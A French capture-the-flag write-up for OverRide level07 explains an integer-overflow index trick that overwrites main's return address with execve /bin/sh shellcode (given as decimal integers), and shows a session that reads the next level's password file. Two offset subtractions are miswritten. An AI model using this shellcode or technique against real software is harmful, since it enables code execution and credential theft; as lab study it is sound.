## level07
- L'examen du [code source désassemblé](/level07/source.c) fait penser qu'on pourrait profiter de la fonction `store_number` pour injecter un *shellcode*. Mais deux obstacles viennent entraver cette approche :
    - la fonction `main` commence par vider complètement les arguments du programme et l'environnement d'exécution. Donc on ne pourra pas placer notre *shellcode* dans l'environnement comme on a pu le faire dans le [niveau 04](/level04/Ressources/README.md).
    - dans `store_number`, le nombre donné ne sera stocké à l'index prévu que si `index` n'est pas un multiple de 3 (ou zéro) et que l'octet le plus significatif de `input` n'est pas égal à `0xb7` (183 en décimal). Mais, à part ça, il est possible de rentrer n'importe quel index (y compris supérieur à 100) ; or `number[100]` est défini comme variable locale dans `main` et est donc stocké sur la pile.

- Nous allons à chercher à écraser l'adresse de retour de `main` pour exécuter à la place notre *shellcode*.
    - Il faut tout d'abord déterminer où sont situés `number[100]` et l'adresse de retour de `main`, afin de pouvoir calculer le décalage permettant d'écraser la dernière depuis la première.
        - En désassemblant `main`, on voit que `number[100]` est placé en haut de la pile juste avant l'appel à `read_number`, à l'adresse `0x0804892b <+520>`. Nous allons y placer notre premier *breakpoint*. À la fin du `main`, on voit que le retour se fait à l'adresse `0x080489f1 <+718>` : nous y plaçons notre second *breakpoint*.
        - On lance le binaire avec l'instruction `read` pour arriver sur notre premier *breakpoint*. `x/x $esp` nous permet d'obtenir le contenu de l'ESP (`0xffffd544`). On poursuit l'exécution jusqu'à lancer l'instruction `quit` ; en arrivant sur notre second *breakpoint*, ``x/x $esp` nous informe que l'ESP est à l'adresse `0xffffd70c`.
        - `0xffffd70c` - `0xffffd520` = `0x1c8` (456 en décimal) => On utilisera un décalage de 114 (puisque l'on bouge par bloc de 4 octets).
    - Ensuite, on doit pouvoir retrouver l'adresse du tableau `number[100]` au moment de l'exécution.
        - On commence par un *breakpoint* sur `read_number` ; puis on lance le binaire avec l'instruction `read`. `info frame` nous apprend que `Previous frame's sp is 0xffffd520`. Avec `x 0xffffd520`, on sait que le *stack pointer* précédent contient la valeur `0xffffd544`.
        - `0xffffd520` - `0xffffd544` = `0x24` (36 en décimal) => on devra faire un `read` sur l'index -9 pour retrouver l'adresse de `number[100]` au moment de l'exécution
    - Enfin, il faut obtenir un *shellcode*. Comme il sera stocké dans `number`, il faut faire avec les contraintes sur `index` : zéro et tous les multiples de trois ne seront pas utilisables.
        - Mais il est possible de contourner cette limitation avec un [*integer overflow*](https://en.wikipedia.org/wiki/Integer_overflow), par exemple en utilisant 1073741824 (c'est-à-dire 2^32/4) au lieu de zéro. 
        - De même, on ne peut pas utiliser directement l'index 114 (c'est un multiple de 3) ; donc on devra stocker à l'index 1073741938 (1073741824 + 114).
        - En partant de ce [*shellcode*](http://shell-storm.org/shellcode/files/shellcode-575.php), on arrive à :  

        | Hexa de l'ASM | Nombre hexa | Nombre décimal |
        |---------------|-------------|----------------|
        | 6a 0b 58 99   | 0x99580b6a  | 2572684138     |
        | 52 68 2f 2f   | 0x2f2f6852  | 791636050      |
        | 73 68 68 2f   | 0x2f686873  | 795371635      |
        | 62 69 6e 89   | 0x896e6962  | 2305714530     |
        | e3 31 c9 cd   | 0xcdc931e3  | 3452514787     |
        | 80            | 0x80        | 128            |
        Les instructions correspondantes sont aussi dans le fichier [`payload.txt`](payload.txt).

- Au final, l'exploitation se fait facilement :
```
level07@OverRide:~$ cat /tmp/payload.txt - | ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
read
Input command:  Index: -9
 Number at data[4294967287] is 4294956388
 Completed read command successfully
store
Input command:  Number: 4294956388
 Index: 1073741938
 Completed store command successfully
quit
whoami
level08
cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```